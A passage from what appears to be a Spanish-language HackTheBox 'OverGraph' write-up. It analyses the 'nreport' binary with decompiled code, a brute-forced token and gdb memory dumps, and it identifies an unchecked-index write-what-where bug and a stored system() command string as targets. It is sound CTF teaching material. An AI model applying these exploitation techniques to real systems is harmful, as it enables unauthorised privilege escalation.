<span class="mtk1">  userinfo1._56_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7461642824206e4f</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._64_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2f203e3e20222965</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._72_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2f676f6c2f726176</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._80_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">74726f7065726b</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  userinfo1._40_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">614c22206f686365</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._48_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2064657355207473</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._56_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">7461642824206e4f</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._64_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2f203e3e20222965</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._72_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">2f676f6c2f726176</span><span class="mtk1">;</span>
<span class="mtk1">  userinfo1._80_8_ </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">74726f7065726b</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Lo primero que necesitamos es construir un <em>token</em> que pase todas las comprobaciones:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter Your Token: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">120</span><span class="mtk1">,</span> <span class="mtk6">19</span><span class="mtk1">, stdin);</span>
<span class="mtk1">  sVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strlen</span><span class="mtk1">(userinfo1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">120</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (sVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">15</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">13</span><span class="mtk1">; </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> i; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">local_48 </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">=</span>
<span class="mtk1">         </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (secret </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">121</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">122</span><span class="mtk1">] </span><span class="mtk5">^</span>  
<span class="mtk1">         (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">120</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">129</span><span class="mtk1">] </span><span class="mtk5">^</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) userinfo1[</span><span class="mtk6">133</span><span class="mtk1">];</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_40 </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_48 </span><span class="mtk5">+</span><span class="mtk1"> local_48._4_4_ </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">134</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_28._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> local_30._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_28 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">145</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (local_18._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> local_20._4_4_ </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) local_18 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">109</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid Token"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
</code></pre></div><p>La primera comprobación es que la longitud del <em>token</em> sea 15 bytes, lo cual es fácil. Bueno, realmente 14, porque el último byte será el carácter de salto de línea (<code>\n</code>).</p><p>Luego, el programa realiza operaciones XOR con una variable <code>secret</code> y algunos de los bytes introducidos. De hecho, estos bytes son <code>userinfo1[120]</code>, <code>userinfo1[121]</code>, <code>userinfo1[122]</code>, <code>userinfo1[129]</code> y <code>userinfo1[133]</code>. El resto de los bytes no afectan. Por esta razón, podemos emplear un ataque de fuerza bruta sobre estos 5 bytes hasta que encontremos un <em>token</em> válido (hay varios). Para ello, escribí un <em>script</em> sencillo en Python usando <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph/bf_token.py"><code>bf_token.py</code></a> (explicación detallada <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/OverGraph#bf_tokenpy">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">bf_token.py</span>
[<span class="code-blue">*</span>] './nreport_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3fd000)</span>
    RUNPATH:  <span class="code-dark-red">b'./libc'</span>

[<span class="code-green">+</span>] Valid token: hD]AAAAAAVAAAT

<span class="code-cyan">$</span> <span class="code-dark-green">./nreport_patched</span>
Custom Reporting v1

Enter Your Token: hD]AAAAAAVAAAT  
Enter Name: asdf

Welcome asdf
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt;
</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Ahora llegamos al menú que vimos en el <code>main</code>. Parece a un reto típico de explotación del <em>heap</em>.</p><p>De hecho, si analizamos las funciones <code>create</code>, <code>delete</code> y <code>edit</code>, todas usan <code>calloc</code> y <code>free</code>, por lo que estamos trabajando en el espacio de direcciones del <em>heap</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">pvVar1;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">You can only create 10 messages at a time</span><span class="mtk6">\n</span><span class="mtk4">Messages Created: </span><span class="mtk6">%i\n\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) Arryindex);</span>  
<span class="mtk1">  pvVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">calloc</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">a1</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message Title: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">59[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, pvVar1);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">100[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) pvVar1 </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (</span><span class="mtk7 mtki">int</span><span class="mtk1">) Arryindex </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> pvVar1;</span>
<span class="mtk1">  Arryindex </span><span class="mtk5">=</span><span class="mtk1"> Arryindex </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message number to delete: "</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
<span class="mtk1">  </span><span class="mtk8">free</span><span class="mtk1">(</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">  Arryindex </span><span class="mtk5">=</span><span class="mtk1"> Arryindex </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Message Deleted"</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
<span class="mtk1">  </span>
<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (Arryindex </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"No Message Created"</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter number to edit: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message Title: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">59[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk10">%</span><span class="mtk4">100[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">);</span>  
<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(stdin);</span>
<span class="mtk1">    </span><span class="mtk8">fflush</span><span class="mtk1">(stdout);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Sin embargo, no se puede hacer mucho con un <em>exploit</em> de <em>heap</em> en este caso. Aunque sí se puede realizar un ataque de <em>Unsorted Bin</em>, no podemos escalarlo a algo más crítico o sería muy difícil de realizar. Este ataque es posible porque podemos editar <em>chunks</em> liberados y modificar el puntero <code>bk</code>, de manera que al asignar un nuevo <em>chunk</em>, una dirección de <code>main_arena</code> se escribe en la dirección que aparece en <code>bk</code> (más información en <a href="https://guyinatuxedo.github.io/31-unsortedbin_attack/unsorted_explanation/index.html">Nightmare</a>). Puedes olvidar esto último si no lo entendiste, no hará falta.</p><p>Un <em>exploit</em> que funcione para este binario no tiene que ver con el <em>heap</em>. De hecho, vamos a mirar la función <code>edit</code> más detenidamente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Enter number to edit: "</span><span class="mtk1">);</span>
<span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%d</span><span class="mtk4">[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
<span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Message Title: "</span><span class="mtk1">);</span>
<span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">" </span><span class="mtk10">%</span><span class="mtk4">59[^</span><span class="mtk6">\n</span><span class="mtk4">]"</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk1">(undefined8 </span><span class="mtk5">*</span><span class="mtk1">) (message_array </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">));</span>  
</code></pre></div><p>¿Puedes ver el <em>bug</em>? Sí, el programa pregunta por un índice y luego lo utiliza como <em>offset</em> para calcular la dirección donde escribir (<code>message_array + index * 8</code>). Como no hay validación sobre este índice, podemos controlar dónde escribimos (esto es lo que se conoce como primitiva <em>write-what-where</em>). Vamos a mirar las variables que aparecen en <code>auth</code> después de poner el <em>token</em> válido:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">./nreport_patched</span>
Reading symbols from <span class="code-dark-green">./nreport_patched</span>...
(No debugging symbols found in <span class="code-dark-green">./nreport_patched</span>)
<span class="code-red">gef➤  </span>run
Starting program: /home/rocky/Desktop/HTB/Machines/OverGraph/nreport_patched
Custom Reporting v1

Enter Your Token: hD]AAAAAAVAAAT
Enter Name: asdf

Welcome asdf
1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt; ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7b18ad0</span> in <span class="code-dark-yellow">__read_nocancel</span> () at <span class="code-dark-green">../sysdeps/unix/syscall-template.S</span>:84  
84      ../sysdeps/unix/syscall-template.S: No such file or directory.
</code></pre></div><p>Por ejemplo, tenemos una variable global llamada <code>userinfo1</code>, que está referenciada como <code>userinfo1</code>, <code>userinfo1 + 40</code>, <code>userinfo1 + 0x78</code> y <code>userinfo1 + 140</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/s (char *) &userinfo1
<span class="code-dark-blue">0x404180</span> &lt;<span class="code-dark-yellow">userinfo1</span>&gt;:   "asdf"
<span class="code-green">gef➤  </span>x/s (char *)&userinfo1+40
<span class="code-dark-blue">0x4041a8</span> &lt;<span class="code-dark-yellow">userinfo1</span>+40&gt;:        "echo \"Last Used On $(date)\" &gt;&gt; /var/log/kreport"  
<span class="code-green">gef➤  </span>x/s (char *) &userinfo1 + 0x78
<span class="code-dark-blue">0x4041f8</span> &lt;<span class="code-dark-yellow">userinfo1</span>+120&gt;:       "hD]AAAAAAVAAAT\n"
<span class="code-green">gef➤  </span>x/s (char *) &userinfo1 + 140
<span class="code-dark-blue">0x40420c</span> &lt;<span class="code-dark-yellow">userinfo1</span>+140&gt;:       "/opt/crv1/asdf"
</code></pre></div><p>Aquí tenemos algunas cosas interesantes:</p><ul><li>La cadena <code>"asdf"</code> (nuestro nombre) es algo que podemos controlar</li><li>La cadena <code>"echo \"Last Used On $(date)\" >> /var/log/kreport"</code> se utiliza como comando de sistema y se ejecuta antes de salir con la opción <code>5</code></li><li>La cadena <code>"/opt/crv1/asdf"</code> será el archivo utilizado por la función <code>report</code> para guardar nuestros mensajes</li></ul><p>Además, estas son las direcciones de <code>message_array</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx &message_array
<span class="code-dark-blue">0x404120</span> &lt;<span class="code-dark-yellow">message_array</span>&gt;:       0x0000000000000000      0x0000000000000000  
<span class="code-dark-blue">0x404130</span> &lt;<span class="code-dark-yellow">message_array</span>+16&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404140</span> &lt;<span class="code-dark-yellow">message_array</span>+32&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404150</span> &lt;<span class="code-dark-yellow">message_array</span>+48&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404160</span> &lt;<span class="code-dark-yellow">message_array</span>+64&gt;:    0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404170</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404180</span> &lt;<span class="code-dark-yellow">userinfo1</span>&gt;:   0x0000000066647361      0x0000000000000000
<span class="code-dark-blue">0x404190</span> &lt;<span class="code-dark-yellow">userinfo1</span>+16&gt;:        0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4041a0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+32&gt;:        0x0000000000000000      0x614c22206f686365
<span class="code-dark-blue">0x4041b0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+48&gt;:        0x2064657355207473      0x7461642824206e4f
<span class="code-dark-blue">0x4041c0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+64&gt;:        0x2f203e3e20222965      0x2f676f6c2f726176
<span class="code-dark-blue">0x4041d0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+80&gt;:        0x0074726f7065726b      0x0000000000000000
<span class="code-dark-blue">0x4041e0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+96&gt;:        0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4041f0</span> &lt;<span class="code-dark-yellow">userinfo1</span>+112&gt;:       0x0000000000000000      0x41414141415d4468
<span class="code-dark-blue">0x404200</span> &lt;<span class="code-dark-yellow">userinfo1</span>+128&gt;:       0x000a544141415641      0x74706f2f00000000
<span class="code-dark-blue">0x404210</span> &lt;<span class="code-dark-yellow">userinfo1</span>+144&gt;:       0x73612f317672632f      0x0000000000006664
<span class="code-dark-blue">0x404220</span> &lt;<span class="code-dark-yellow">userinfo1</span>+160&gt;:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404230</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404240</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x404250</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>De momento, vamos a crear un mensaje:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>continue
Continuing.
1

You can only create 10 messages at a time
Messages Created: 0

Message Title: AAAA
Message: BBBB

1.Create New Message
2.Delete a Message
3.Edit Messages
4.Report All Messages
5.Exit
&gt; ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7b18ad0</span> in <span class="code-dark-yellow">__read_nocancel</span> () at <span class="code-dark-green">../sysdeps/unix/syscall-template.S</span>:84  
84      in <span class="code-dark-green">../sysdeps/unix/syscall-template.S
</code></pre></div><p>Ahora, si imprimimos el contenido de <code>message_array</code>, vemos una dirección (<code>0x405830</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx &message_array
